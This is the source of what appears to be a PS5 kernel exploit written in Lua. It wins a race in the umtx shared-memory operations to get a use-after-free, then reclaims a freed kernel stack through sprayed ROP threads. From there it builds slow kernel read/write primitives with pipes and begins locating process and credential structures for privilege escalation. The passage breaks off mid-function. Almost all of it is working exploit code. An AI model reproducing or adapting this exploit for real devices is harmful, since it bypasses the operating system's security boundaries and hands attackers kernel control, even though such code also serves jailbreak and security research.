
-- umtx kernel exploit for ps5
-- setup kernel r/w primitives and escalate current game process

-- credits to all authors whose code was used as reference

umtx = {}
kstack_kernel_rw = {}

-- configurations

debug = false -- print more logging info

force_kdata_patch_with_gpu = false

umtx.config = {
    max_attempt = 100,
    max_race_attempt = 0x100,
    num_spray_fds = 0x28,
    num_kprim_threads = 0x180,
}

umtx.thread_config = {
    main_thread = { core = 0, prio = 256 },
    destroyer_thread = { core = {1, 2}, prio = 256 },
    lookup_thread = { core = 4, prio = 400 },
    reclaim_thread = { core = -1, prio = 450 }
}

syscall.resolve({
    mprotect = 0x4a,
    dup2 = 0x5a,
    fcntl = 0x5c,
    select = 0x5d,
    fstat = 0xbd,
    umtx_op = 0x1c6,
    cpuset_getaffinity = 0x1e7,
    cpuset_setaffinity = 0x1e8,
    rtprio_thread = 0x1d2,
    ftruncate = 0x1e0,
    sched_yield = 0x14b,
    munmap = 0x49,
    thr_new = 0x1c7,
    thr_exit = 0x1af,
    is_in_sandbox = 0x249,
})





-- globals vars

UMTX_OP_SHM         = 26
UMTX_SHM_CREAT      = 0x0001
UMTX_SHM_LOOKUP     = 0x0002
UMTX_SHM_DESTROY    = 0x0004

OFFSET_STAT_SIZE = 0x48
OFFSET_IOV_BASE = 0x00
OFFSET_IOV_LEN = 0x08
SIZE_IOV = 0x10
OFFSET_UIO_RESID = 0x18
OFFSET_UIO_SEGFLG = 0x20
OFFSET_UIO_RW = 0x24

OFFSET_VM_MAP_ENTRY_OBJECT = 80
OFFSET_VM_OBJECT_REF_COUNT = 132

OFFSET_P_UCRED = 0x40
OFFSET_P_FD = 0x48
OFFSET_P_VM_SPACE = 0x200
OFFSET_FDESCENTTBL_FDT_OFILES = 0x8

OFFSET_THREAD_TD_NAME = 0x294
OFFSET_THREAD_TD_PROC = 0x8

OFFSET_UCRED_CR_SCEAUTHID = 0x58
OFFSET_UCRED_CR_SCECAPS = 0x60
OFFSET_UCRED_CR_SCEATTRS = 0x83

RTP_LOOKUP = 0
RTP_SET = 1

KADDR_MASK = uint64("0xffff800000000000")
KDATA_MASK = uint64("0xffff804000000000")

SYSTEM_AUTHID = uint64("0x4800000000010003")
COREDUMP_AUTHID = uint64("0x4800000000000006")






-- misc functions

function dbg(s)
    if debug then
        print(s)
    end
end

function dbgf(...)
    if debug then
        dbg(string.format(...))
    end
end

function calculate_shifts(n)
    return math.floor(math.log(n) / math.log(2))
end

function wait_for(addr, threshold, ms)
    while memory.read_qword(addr):tonumber() ~= threshold do
        sleep(1, "ms")
    end
end





-- cpu related functions

function pin_to_core(core)
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    memory.write_word(mask, bit32.lshift(1, core))
    return syscall.cpuset_setaffinity(level, which, id, setsize, mask)
end

function get_core_index(mask_addr)
    local num = memory.read_dword(mask_addr):tonumber()
    local position = 0
    while num > 0 do
        num = bit32.rshift(num, 1)
        position = position + 1
    end
    return position - 1
end

function get_current_core()
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    syscall.cpuset_getaffinity(level, which, id, 0x10, mask)
    return get_core_index(mask)
end

function rtprio(type, prio)

    local PRI_REALTIME = 2
    local rtprio = memory.alloc(0x4)
    memory.write_word(rtprio, PRI_REALTIME)
    memory.write_word(rtprio + 0x2, prio or 0)  -- current_prio

    syscall.rtprio_thread(type, 0, rtprio):tonumber()

    if type == RTP_LOOKUP then
        return memory.read_word(rtprio + 0x2):tonumber() -- current_prio
    end
end

function set_rtprio(prio)
    rtprio(RTP_SET, prio)
end

function get_rtprio(prio)
    return rtprio(RTP_LOOKUP)
end



-- rop functions

function rop_get_current_core(chain, mask)
    local level = 3
    local which = 1
    local id = -1
    chain:push_syscall(syscall.cpuset_getaffinity, level, which, id, 0x10, mask)
end

function rop_pin_to_core(chain, core)
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    memory.write_word(mask, bit32.lshift(1, core))
    chain:push_syscall(syscall.cpuset_setaffinity, level, which, id, setsize, mask)
end

function rop_set_rtprio(chain, prio)
    local PRI_REALTIME = 2
    local rtprio = memory.alloc(0x4)
    memory.write_word(rtprio, PRI_REALTIME)
    memory.write_word(rtprio + 0x2, prio)
    chain:push_syscall(syscall.rtprio_thread, 1, 0, rtprio)
end

-- spin until comparison is false
function rop_wait_for(chain, value_address, op, compare_value)
    chain:gen_loop(value_address, op, compare_value, function()
        chain:push_syscall(syscall.sched_yield)
    end)
end



-- umtx shm functions

function umtx_shm(flag, key)
    return syscall.umtx_op(0, UMTX_OP_SHM, flag, key)
end

function umtx_shm_create(key)
    return umtx_shm(UMTX_SHM_CREAT, key)
end

function umtx_shm_lookup(key)
    return umtx_shm(UMTX_SHM_LOOKUP, key)
end

function umtx_shm_destroy(key)
    return umtx_shm(UMTX_SHM_DESTROY, key)
end

function shm_resize_tag(fd, size)
    size = size or fd * PAGE_SIZE
    return syscall.ftruncate(fd, size)
end

function get_fd_size(fd)
    local stat = memory.alloc(0x100)
    if syscall.fstat(fd, stat):tonumber() == -1 then
        return nil
    end
    return memory.read_dword(stat + OFFSET_STAT_SIZE):tonumber()
end

function shm_close(fd)
    return syscall.close(fd)
end






--
-- primitive thread class
--
-- use thr_new to spawn new thread
--
-- only bare syscalls are supported. any attempt to call into few libc 
-- fns (such as printf/puts) will result in a crash
--

prim_thread = {}
prim_thread.__index = prim_thread

function prim_thread.init()

    local setjmp = fcall(libc_addrofs.setjmp)
    local jmpbuf = memory.alloc(0x60)
    
    -- get existing regs state
    setjmp(jmpbuf)

    prim_thread.fpu_ctrl_value = memory.read_dword(jmpbuf + 0x40)
    prim_thread.mxcsr_value = memory.read_dword(jmpbuf + 0x44)

    prim_thread.initialized = true
end

function prim_thread:prepare_structure()

    local jmpbuf = memory.alloc(0x60)

    -- skeleton jmpbuf
    memory.write_qword(jmpbuf, gadgets["ret"]) -- ret addr
    memory.write_qword(jmpbuf + 0x10, self.chain.stack_base) -- rsp - pivot to ropchain
    memory.write_dword(jmpbuf + 0x40, prim_thread.fpu_ctrl_value) -- fpu control word
    memory.write_dword(jmpbuf + 0x44, prim_thread.mxcsr_value) -- mxcsr

    -- prep structure for thr_new

    local stack_size = 0x400
    local tls_size = 0x40
    
    self.thr_new_args = memory.alloc(0x80)
    self.tid_addr = memory.alloc(0x8)

    local cpid = memory.alloc(0x8)
    local stack = memory.alloc(stack_size)
    local tls = memory.alloc(tls_size)

    memory.write_qword(self.thr_new_args, libc_addrofs.longjmp) -- fn
    memory.write_qword(self.thr_new_args + 0x8, jmpbuf) -- arg
    memory.write_qword(self.thr_new_args + 0x10, stack)
    memory.write_qword(self.thr_new_args + 0x18, stack_size)
    memory.write_qword(self.thr_new_args + 0x20, tls)
    memory.write_qword(self.thr_new_args + 0x28, tls_size)
    memory.write_qword(self.thr_new_args + 0x30, self.tid_addr) -- child pid
    memory.write_qword(self.thr_new_args + 0x38, cpid) -- parent tid

    self.ready = true
end


function prim_thread:new(chain)

    if not prim_thread.initialized then
        prim_thread.init()
    end

    if not chain.stack_base then
        error("`chain` argument must be a ropchain() object")
    end

    -- exit ropchain once finished
    chain:push_syscall(syscall.thr_exit, 0)

    local self = setmetatable({}, prim_thread)    
    
    self.chain = chain

    return self
end

-- run ropchain in primitive thread
function prim_thread:run()

    if not self.ready then
        self:prepare_structure()
    end

    -- spawn new thread
    if syscall.thr_new(self.thr_new_args, 0x68):tonumber() == -1 then
        error("thr_new() error: " .. get_error_string())
    end

    self.ready = false
    self.tid = memory.read_qword(self.tid_addr):tonumber()
    
    return self.tid
end






-- umtx class

umtx.data = {

    lookup_cpu_mask = memory.alloc(0x10),
    destroyer_cpu_mask = { memory.alloc(0x10), memory.alloc(0x10) },

    lookup_fd = -1,
    winner_fd = nil,
    kstack = nil,

    fd_tofix = {},
    kstack_tofix = {},

    race_rop = {},
    kprim_rop = {},

    primary_shm_key = memory.alloc(0x8),
    secondary_shm_key = memory.alloc(0x8),

    race = {
        spray_fds = memory.alloc(0x1000),
        lookup_fd_addr = memory.alloc(0x8),
        start_signal = memory.alloc(0x8),
        exit_signal = memory.alloc(0x8),
        resume_signal = memory.alloc(0x8),
        ready_count = memory.alloc(0x8),
        shm_op_done = memory.alloc(0x8),
        done_count = memory.alloc(0x8),
        destroy_count = memory.alloc(0x8),
        finished_count = memory.alloc(0x8),
    },

    kprim = {
        read_size = memory.alloc(0x8),
        ready_count = memory.alloc(0x8),
        exit_signal = memory.alloc(0x8),
        thr_index = memory.alloc(0x8),
        cmd_stop = memory.alloc(0x8),
        cmd_ready = memory.alloc(0x8),
        cmd_no = memory.alloc(0x8),
        cmd_reset = memory.alloc(0x8),
        read_counter = memory.alloc(0x8),
        write_counter = memory.alloc(0x8),
        cmd_counter = memory.alloc(0x8),
        exited_count = memory.alloc(0x8),
    }
}

function umtx.prepare_shm_lookup_rop()

    local chain = ropchain()

    rop_pin_to_core(chain, umtx.thread_config.lookup_thread.core)
    rop_set_rtprio(chain, umtx.thread_config.lookup_thread.prio)
    rop_get_current_core(chain, umtx.data.lookup_cpu_mask)

    chain:gen_loop(umtx.data.race.exit_signal, "==", 0, function()

        chain:push_increment_atomic_qword(umtx.data.race.ready_count)

        -- wait until it receives signal to resume
        rop_wait_for(chain, umtx.data.race.start_signal, "==", 0)

        -- do shm lookup operation
        chain:push_syscall(syscall.umtx_op, 0, UMTX_OP_SHM, UMTX_SHM_LOOKUP, umtx.data.primary_shm_key)
        chain:push_store_rax_into_memory(umtx.data.race.lookup_fd_addr)
        
        chain:push_increment_atomic_qword(umtx.data.race.shm_op_done)
        chain:push_increment_atomic_qword(umtx.data.race.done_count)

        -- wait until it receives signal to resume
        rop_wait_for(chain, umtx.data.race.resume_signal, "==", 0)
    end)

    chain:push_increment_atomic_qword(umtx.data.race.finished_count)

    table.insert(umtx.data.race_rop, chain)
end

function umtx.prepare_shm_destroy_rop()

    for i=1,2 do

        local chain = ropchain({
            stack_size = 0x10000
        })

        rop_pin_to_core(chain, umtx.thread_config.destroyer_thread.core[i])
        rop_set_rtprio(chain, umtx.thread_config.destroyer_thread.prio)
        rop_get_current_core(chain, umtx.data.destroyer_cpu_mask[i])

        chain:gen_loop(umtx.data.race.exit_signal, "==", 0, function()

            chain:push_increment_atomic_qword(umtx.data.race.ready_count)

            -- wait until it receives signal to resume
            rop_wait_for(chain, umtx.data.race.start_signal, "==", 0)

            -- do shm destroy operation
            chain:push_syscall_with_ret(syscall.umtx_op, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, umtx.data.primary_shm_key)

            chain:gen_conditional(chain:get_last_retval_addr(), "==", 0, function()
                -- increment counter if destroy operation succeed
                chain:push_increment_atomic_qword(umtx.data.race.destroy_count)
            end)

            chain:push_increment_atomic_qword(umtx.data.race.shm_op_done)

            -- wait until all shm operations finished
            rop_wait_for(chain, umtx.data.race.shm_op_done, "~=", 3)

            -- spray shmfds when the condition is right
            chain:gen_conditional(umtx.data.race.destroy_count, "==", 2, function()
                chain:gen_conditional(umtx.data.race.lookup_fd_addr, "~=", -1, function()

                    for idx = i-1, (umtx.config.num_spray_fds * 2)-1, 2 do

                        local fd_store_addr = umtx.data.race.spray_fds + idx*8

                        chain:push_syscall(syscall.umtx_op, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, umtx.data.secondary_shm_key)
                        chain:push_store_rax_into_memory(fd_store_addr)

                        -- syscall.ftruncate(fd, fd * PAGE_SIZE)
                        chain:push_syscall_raw(syscall.ftruncate, function()
                            chain:push_set_rax_from_memory(fd_store_addr)
                            chain:push_set_rcx(calculate_shifts(PAGE_SIZE))
                            chain:push(gadgets["shl rax, cl; ret"])
                            chain:push_set_reg_from_rax("rsi")  -- rsi = fd * PAGE_SIZE
                            chain:push_set_reg_from_memory("rdi", fd_store_addr)  -- rdi = fd
                        end)

                        chain:push_syscall(syscall.umtx_op, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, umtx.data.secondary_shm_key)
                    end

                end)
            end)

            chain:push_increment_atomic_qword(umtx.data.race.done_count)

            -- wait until it receives signal to resume
            rop_wait_for(chain, umtx.data.race.resume_signal, "==", 0)
        end)

        chain:push_increment_atomic_qword(umtx.data.race.finished_count)

        table.insert(umtx.data.race_rop, chain)
    end
end

function umtx.prepare_kprim_rop()

    local timeout = 1 -- sec

    for i=1,umtx.config.num_kprim_threads do

        local cookie = memory.alloc(0x10)
        local timeval = memory.alloc(0x10)

        memory.write_qword(timeval, math.floor(timeout))

        local chain = ropchain({
            stack_size = 0x5000
        })

        rop_set_rtprio(chain, umtx.thread_config.reclaim_thread.prio)
        
        chain:push_increment_atomic_qword(umtx.data.kprim.ready_count)

        -- wait until we manage to reclaim kstack
        chain:gen_loop(umtx.data.kprim.exit_signal, "==", 0, function()
            chain:push_write_qword_memory(cookie, 0x13370000 + i)
            chain:push_syscall(syscall.select, 1, cookie, 0, 0, timeval) -- push cookie to kstack
            chain:push_syscall(syscall.sched_yield)
        end)

        -- check if this thread is the one who reclaimed the freed page
        chain:gen_conditional(umtx.data.kprim.thr_index, "==", i, function()

            -- mark cmd as ready
            chain:push_increment_atomic_qword(umtx.data.kprim.cmd_ready)
            
            chain:gen_loop(umtx.data.kprim.cmd_stop, "==", 0, function()

                -- wait until it receives command
                rop_wait_for(chain, umtx.data.kprim.cmd_no, "==", kstack_kernel_rw.cmd.nop)

                -- read cmd
                chain:gen_conditional(umtx.data.kprim.cmd_no, "==", kstack_kernel_rw.cmd.read, function()
                    chain:push_increment_atomic_qword(umtx.data.kprim.read_counter)
                    chain:push_syscall_raw(syscall.write, function()
                        chain:push_set_rax_from_memory(umtx.data.kprim.read_size)
                        chain:push_set_reg_from_rax("rdx")
                        chain:push_set_rsi(kstack_kernel_rw.data.pipe_buf)
                        chain:push_set_rdi(kstack_kernel_rw.data.pipe_write_fd)
                    end)
                end)

                -- write cmd
                chain:gen_conditional(umtx.data.kprim.cmd_no, "==", kstack_kernel_rw.cmd.write, function()
                    chain:push_increment_atomic_qword(umtx.data.kprim.write_counter)
                    chain:push_syscall_raw(syscall.read, function()
                        chain:push_set_rax_from_memory(umtx.data.kprim.read_size)
                        chain:push_set_reg_from_rax("rdx")
                        chain:push_set_rsi(kstack_kernel_rw.data.pipe_buf)
                        chain:push_set_rdi(kstack_kernel_rw.data.pipe_read_fd)
                    end)
                end)

                -- exit cmd
                chain:gen_conditional(umtx.data.kprim.cmd_no, "==", kstack_kernel_rw.cmd.exit, function()
                    chain:push_write_qword_memory(umtx.data.kprim.cmd_stop, 1)
                end)

                chain:push_increment_atomic_qword(umtx.data.kprim.cmd_counter)

                -- reset for next run
                chain:push_write_qword_memory(umtx.data.kprim.cmd_no, 0)
            end)
        end)

        chain:push_increment_atomic_qword(umtx.data.kprim.exited_count)

        table.insert(umtx.data.kprim_rop, chain)
    end
end

function umtx.get_race_threads()
    local thr_list = {}
    for i,rop in ipairs(umtx.data.race_rop) do
        local thr = prim_thread:new(rop)
        thr:prepare_structure()
        table.insert(thr_list, thr)
    end
    return thr_list
end

function umtx.get_kprim_threads()
    local thr_list = {}
    for i,rop in ipairs(umtx.data.kprim_rop) do
        local thr = prim_thread:new(rop)
        thr:prepare_structure()
        table.insert(thr_list, thr)
    end
    return thr_list
end

function umtx.get_shmfd_from_size(lookup_fd)

    local size_fd = get_fd_size(lookup_fd)
    if not size_fd then
        return nil
    end

    local size_fd = size_fd / PAGE_SIZE
    if size_fd <= 0x6 or size_fd >= 0x400 or size_fd == lookup_fd then
        return nil
    end

    return size_fd
end

function umtx.reset_race_state()

    local lookup_fd = umtx.data.lookup_fd

    -- close the fd if we can safely do it
    if lookup_fd ~= -1 and not umtx.data.fd_tofix[lookup_fd] then
        shm_close(lookup_fd)
        umtx.data.lookup_fd = -1
    end

    -- destroy primary user mutex
    umtx_shm_destroy(umtx.data.primary_shm_key)

    -- destroy secondary user mutex
    umtx_shm_destroy(umtx.data.secondary_shm_key)

    -- clean up race states
    memory.write_qword(umtx.data.race.lookup_fd_addr, 0)
    memory.write_qword(umtx.data.race.start_signal, 0)
    memory.write_qword(umtx.data.race.exit_signal, 0)
    memory.write_qword(umtx.data.race.resume_signal, 0)
    memory.write_qword(umtx.data.race.ready_count, 0)
    memory.write_qword(umtx.data.race.shm_op_done, 0)
    memory.write_qword(umtx.data.race.done_count, 0)
    memory.write_qword(umtx.data.race.destroy_count, 0)
    memory.write_qword(umtx.data.race.finished_count, 0)
end

function umtx.reset_kprim_state()
    memory.write_qword(umtx.data.kprim.read_size, 0)
    memory.write_qword(umtx.data.kprim.ready_count, 0)
    memory.write_qword(umtx.data.kprim.exit_signal, 0)
    memory.write_qword(umtx.data.kprim.thr_index, 0)
    memory.write_qword(umtx.data.kprim.cmd_stop, 0)
    memory.write_qword(umtx.data.kprim.cmd_ready, 0)
    memory.write_qword(umtx.data.kprim.cmd_no, 0)
    memory.write_qword(umtx.data.kprim.cmd_reset, 0)
    memory.write_qword(umtx.data.kprim.read_counter, 0)
    memory.write_qword(umtx.data.kprim.write_counter, 0)
    memory.write_qword(umtx.data.kprim.cmd_counter, 0)
    memory.write_qword(umtx.data.kprim.exited_count, 0)
end








function umtx.race()

    dbg("umtx.race() entered")

    pin_to_core(umtx.thread_config.main_thread.core)
    set_rtprio(umtx.thread_config.main_thread.prio)

    dbg("pinned main thread to one core")

    -- init
    umtx.reset_race_state()

    local thr_list = umtx.get_race_threads()

    -- spawn all race threads
    for i,thr in ipairs(thr_list) do
        thr:run()
    end
    
    local num_threads = #thr_list

    wait_for(umtx.data.race.ready_count, num_threads)

    dbgf("all threads ready! num threads = %d", num_threads)

    local main_core = get_current_core()
    local lookup_core = get_core_index(umtx.data.lookup_cpu_mask)
    local destroyer0_core = get_core_index(umtx.data.destroyer_cpu_mask[1])
    local destroyer1_core = get_core_index(umtx.data.destroyer_cpu_mask[2])

    dbgf("main thread (core=%d)", main_core)
    dbgf("lookup thread (core=%d)", lookup_core)
    dbgf("destroyer0 thread (core=%d)", destroyer0_core)
    dbgf("destroyer1 thread (core=%d)", destroyer1_core)

    local winner_fd = nil
    local lookup_fd = nil
    local count = 0

    print("race started")

    for i=1,umtx.config.max_race_attempt do

        dbgf("iteration %d", i)

        local main_fd = umtx_shm_create(umtx.data.primary_shm_key):tonumber()
        shm_resize_tag(main_fd)  -- set size of primary shared memory object, so we can find its descriptor later
        shm_close(main_fd)  -- close this descriptor to decrement reference counter of primary shared memory object

        dbgf("primary shm key prepared = %d", main_fd)

        -- wait until all threads ready
        wait_for(umtx.data.race.ready_count, num_threads)

        dbg("signalling other threads to start the race")

        -- signal all threads to start running
        memory.write_qword(umtx.data.race.resume_signal, 0)
        memory.write_qword(umtx.data.race.start_signal, 1)

        -- wait until all threads finished
        wait_for(umtx.data.race.done_count, num_threads)

        local destroy_count = memory.read_qword(umtx.data.race.destroy_count):tonumber()
        lookup_fd = memory.read_qword(umtx.data.race.lookup_fd_addr):tonumber()

        dbgf("race finished. destroy count = %d lookup fd = %d", destroy_count, lookup_fd)

        local fd = umtx.get_shmfd_from_size(lookup_fd)
        if fd then
            winner_fd = fd
            printf("overlapped shm regions! winner_fd = %d", winner_fd)
        end
        
        -- dont close lookup descriptor right away when it is possibly corrupted
        if destroy_count == 2 and lookup_fd ~= 3 and lookup_fd ~= -1 then
            umtx.data.fd_tofix[lookup_fd] = 1
        end

        dbg("closing sprayed fds")

        -- close other fds
        for i=0, (umtx.config.num_spray_fds * 2) - 1 do
            local addr = umtx.data.race.spray_fds + i*8
            local cur_fd = memory.read_qword(addr):tonumber()
            if cur_fd > 0 and cur_fd ~= winner_fd then
                shm_close(cur_fd)
            end
            memory.write_qword(addr, 0)
        end

        umtx.data.lookup_fd = lookup_fd
        umtx.data.winner_fd = winner_fd

        -- we have won the race
        if umtx.data.winner_fd then
            break
        end

        dbg("failed to win the race. retry")

        if i < umtx.config.max_race_attempt then
  
            -- reset for next run
            umtx.reset_race_state()

            -- signal all threads to restart
            memory.write_qword(umtx.data.race.resume_signal, 1)

            count = count + 1
        end
    end

    -- signal all threads to exit
    memory.write_qword(umtx.data.race.exit_signal, 1)
    memory.write_qword(umtx.data.race.resume_signal, 1)

    wait_for(umtx.data.race.finished_count, num_threads)

    dbg("all threads exited successfully")

    if not winner_fd then
        print("failed to win the race")
        return false
    end

    dbgf("we have won the race after %d attempts", count)
    return true
end

function reclaim_with_rop()

    local thr_list = umtx.get_kprim_threads()

    local chain = ropchain({
        stack_size = 0x10000
    })

    chain:push_syscall_with_ret(syscall.close, umtx.data.winner_fd)
    chain:push_syscall_with_ret(syscall.mmap, 0, PAGE_SIZE, PROT_NONE, MAP_SHARED, umtx.data.lookup_fd, 0)

    for i,thr in ipairs(thr_list) do
        chain:push_syscall(syscall.thr_new, thr.thr_new_args, 0x68)
    end

    chain:restore_through_longjmp()
    chain:execute_through_coroutine()

    local close_ret = memory.read_qword(chain.retval_addr[1]):tonumber()
    local kstack = memory.read_qword(chain.retval_addr[2])

    return close_ret, kstack
end

function reclaim_with_lua()
    
    local thr_list = umtx.get_kprim_threads()

    -- we have 2 fd referencing a shmfd which will be freed if we close 1 fd
    local close_ret = syscall.close(umtx.data.winner_fd):tonumber()
    
    -- map memory of freed shm object
    local kstack = syscall.mmap(0, PAGE_SIZE, PROT_NONE, MAP_SHARED, umtx.data.lookup_fd, 0)

    -- spawn all kprim threads to reclaim freed shm object for kernel stack
    for i,thr in ipairs(thr_list) do
        thr:run()
    end

    sleep(500, "ms") -- give some time for kprim to run

    return close_ret, kstack
end

function umtx.verify_kstack(kstack)

    local cnt = 0x1000/8
    local data = memory.read_multiple_qwords(kstack + 0x3000, cnt)

    local zeroes_count = 0
    local kprim_id = -1

    for i, qword in ipairs(data) do
        local num = qword:tonumber()
        if num ~= 0 then
            if bit32.rshift(num, 16) == 0x1337 then
                -- we have found the cookie
                kprim_id = bit32.band(num, 0xfff)
                break
            end
        else
            zeroes_count = zeroes_count + 1 
        end
    end

    if zeroes_count == cnt or kprim_id == -1 then
        return nil
    end

    return kprim_id
end

function umtx.reclaim_kernel_stack()

    dbg("umtx.reclaim_kernel_stack() called")

    assert(umtx.data.winner_fd and umtx.data.lookup_fd)

    umtx.reset_kprim_state()

    local num_threads = umtx.config.num_kprim_threads

    -- local close_ret, kstack = reclaim_with_rop()
    local close_ret, kstack = reclaim_with_lua()

    wait_for(umtx.data.kprim.ready_count, num_threads)

    dbgf("all kprim threads ready! num threads = %d", num_threads)
    
    if close_ret ~= 0 or kstack:tonumber() == -1 then
        print("failed to reclaim kstack. retry")
        return false
    end

    -- store for fix up
    table.insert(umtx.data.kstack_tofix, kstack)

    printf("managed to reclaim kstack with mmap. kstack = %s", hex(kstack))

    -- change memory protections to r/w
    if syscall.mprotect(kstack, PAGE_SIZE, bit32.bor(PROT_READ, PROT_WRITE)):tonumber() == -1 then
        print("mprotect() error: " .. get_error_string())
        return false
    end

    print("managed to modify kstack memory protection to r/w")

    -- check if we have access to the page
    if not check_memory_access(kstack) then
        
        print("failed to access kstack. retry")
        
        -- unmap failed allocation
        -- todo: verify if this is required
        -- if syscall.munmap(kstack, PAGE_SIZE):tonumber() == -1 then
        --     print("munmap() error: " .. get_error_string())
        -- end

        return false
    end

    print("kstack can be accessed successfully")

    local kprim_id = umtx.verify_kstack(kstack)

    if not kprim_id then
        print("failed to get kprim id from kstack. retry")
        return false
    end

    dbg("kstack hex dump:")
    dbg(memory.hex_dump(kstack + 0x3000, 0x1000))

    -- ask all kprim threads to exit, except for thread that reclaims kstack
    memory.write_qword(umtx.data.kprim.thr_index, kprim_id)
    memory.write_qword(umtx.data.kprim.exit_signal, 1)

    printf("successfully reclaimed kstack (kprim_id = %d)", kprim_id)
    print("waiting all kprim threads to exit (except the winner thread)...")

    wait_for(umtx.data.kprim.exited_count, umtx.config.num_kprim_threads-1)

    umtx.data.kstack = kstack

    return true
end






-- slow kernel r/w using pipe pair + kstack

kstack_kernel_rw.cmd = {
    nop = 0,
    read = 1,
    write = 2,
    exit = 3,
}

kstack_kernel_rw.data = {}

function kstack_kernel_rw.init()
    local read_fd, write_fd = create_pipe()
    kstack_kernel_rw.data.pipe_read_fd = read_fd
    kstack_kernel_rw.data.pipe_write_fd = write_fd
    kstack_kernel_rw.data.pipe_size = 0x10000
    kstack_kernel_rw.data.pipe_buf = memory.alloc(kstack_kernel_rw.data.pipe_size)
    kstack_kernel_rw.data.read_mem = memory.alloc(PAGE_SIZE)
end

function kstack_kernel_rw.update_iov_in_kstack(orig_iov_base, new_iov_base, uio_segflg, is_write, len)

    local stack_iov_offset = -1

    local scan_start = 0x2000
    local scan_max = PAGE_SIZE - 0x50

    for i=scan_start, scan_max-1, 8 do
            
        local possible_iov_base = memory.read_qword(umtx.data.kstack + i + OFFSET_IOV_BASE)
        local possible_iov_len = memory.read_qword(umtx.data.kstack + i + OFFSET_IOV_LEN):tonumber()

        if possible_iov_base == orig_iov_base and possible_iov_len == len then
        
            local possible_uio_resid = memory.read_qword(umtx.data.kstack + i + SIZE_IOV + OFFSET_UIO_RESID):tonumber()
            local possible_uio_segflg = memory.read_dword(umtx.data.kstack + i + SIZE_IOV + OFFSET_UIO_SEGFLG):tonumber()
            local possible_uio_rw = memory.read_dword(umtx.data.kstack + i + SIZE_IOV + OFFSET_UIO_RW):tonumber()

            if possible_uio_resid == len and possible_uio_segflg == 0 and possible_uio_rw == is_write then
                -- printf("found iov on kstack. pos = %s is_write = %d len = %d", hex(i), is_write, len)
                stack_iov_offset = i
                break
            end
        end
    end

    if stack_iov_offset == -1 then
        print("failed to find iov")
        return false
    end

    -- modify iov for kernel address + r/w
    memory.write_qword(umtx.data.kstack + stack_iov_offset + OFFSET_IOV_BASE, new_iov_base)
    memory.write_dword(umtx.data.kstack + stack_iov_offset + SIZE_IOV + OFFSET_UIO_SEGFLG, uio_segflg)

    return true
end

function kstack_kernel_rw.send_cmd_to_kprim_thread(cmd, len)

    memory.write_qword(umtx.data.kprim.read_size, len)
    memory.write_qword(umtx.data.kprim.cmd_no, cmd)

    -- wait a while until kernel stack is populated
    sleep(10, "ms")
end


function kstack_kernel_rw.read_buffer(kaddr, len)

    -- fill up pipe
    for i=0, kstack_kernel_rw.data.pipe_size-1, PHYS_PAGE_SIZE do
        syscall.write(kstack_kernel_rw.data.pipe_write_fd, kstack_kernel_rw.data.pipe_buf, PHYS_PAGE_SIZE)
    end

    -- will hang until we read
    kstack_kernel_rw.send_cmd_to_kprim_thread(kstack_kernel_rw.cmd.read, len)
    kstack_kernel_rw.update_iov_in_kstack(kstack_kernel_rw.data.pipe_buf, kaddr, 1, 1, len)

    local mem = kstack_kernel_rw.data.read_mem
    if len > PAGE_SIZE then
        mem = memory.alloc(len)
    end

    syscall.read(kstack_kernel_rw.data.pipe_read_fd, kstack_kernel_rw.data.pipe_buf, kstack_kernel_rw.data.pipe_size)  -- read garbage
    syscall.read(kstack_kernel_rw.data.pipe_read_fd, mem, len)  -- read kernel data

    -- wait until kprim thread is ready for next run
    wait_for(umtx.data.kprim.cmd_no, 0)

    return memory.read_buffer(mem, len)
end


function kstack_kernel_rw.write_buffer(kaddr, buf)
    
    local len = #buf

    -- will hang until we write
    kstack_kernel_rw.send_cmd_to_kprim_thread(kstack_kernel_rw.cmd.write, len)
    kstack_kernel_rw.update_iov_in_kstack(kstack_kernel_rw.data.pipe_buf, kaddr, 1, 0, len)

    syscall.write(kstack_kernel_rw.data.pipe_write_fd, lua.resolve_value(buf), len)

    -- wait until kprim thread is ready for next run
    wait_for(umtx.data.kprim.cmd_no, 0)
end















-- misc functions after kernel r/w is achieved

function get_kprim_curthr_from_kstack()

    local cnt = 0x1000/8
    local data = memory.read_multiple_qwords(umtx.data.kstack + 0x3000, cnt)

    local kernel_ptrs = {}

    -- store occurences of kernel pointers
    for i, qword in ipairs(data) do
        if qword:tonumber() ~= 0 then
            if bit64.band(qword, KADDR_MASK) == KADDR_MASK then
                local qword_str = hex(qword)
                if not kernel_ptrs[qword_str] then
                    kernel_ptrs[qword_str] = 0
                end
                kernel_ptrs[qword_str] = kernel_ptrs[qword_str] + 1
            end
        end
    end

    -- Find address with most occurance
    local curthr_count, curthr_addr = 0, 0

    for k, v in pairs(kernel_ptrs) do
        if v > curthr_count and uint64(k) < uint64("0xffffffffffffffff") then
            curthr_count = v
            curthr_addr = k
        end
    end

    if curthr_count < 5 then
        error("failed to find curthr_addr")
    end

    return uint64(curthr_addr)
end


function get_fd_data_addr(fd)
    local filedescent_addr = kernel.addr.curproc_ofiles + fd * kernel_offset.SIZEOF_OFILES
    local file_addr = kernel.read_qword(filedescent_addr + 0x0) -- fde_file
    return kernel.read_qword(file_addr + 0x0) -- f_data
end


function find_allproc()

    local proc = kernel.addr.curproc
    local max_attempt = 32

    for i=1,max_attempt do
        if bit64.band(proc, KDATA_MASK) == KDATA_MASK then
            local data_base = proc - kernel_offset.DATA_BASE_ALLPROC
            if bit32.band(data_base.l, 0xfff) == 0 then
                return proc
            end
        end
        proc = kernel.read_qword(proc + 0x8)  -- proc->p_list->le_prev
    end

    error("failed to find allproc")
end


function get_dmap_base()

    assert(kernel.addr.data_base)

    local OFFSET_PM_PML4 = 0x20
    local OFFSET_PM_CR3 = 0x28

    local kernel_pmap_store = kernel.addr.data_base + kernel_offset.DATA_BASE_KERNEL_PMAP_STORE

    local pml4 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_PML4)
    local cr3 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_CR3)
    local dmap_base = pml4 - cr3
    
    return dmap_base, cr3
end


-- use slow kernel r/w to find kernel addresses
function get_initial_kernel_address()
    kernel.addr.kprim_curthr = get_kprim_curthr_from_kstack()
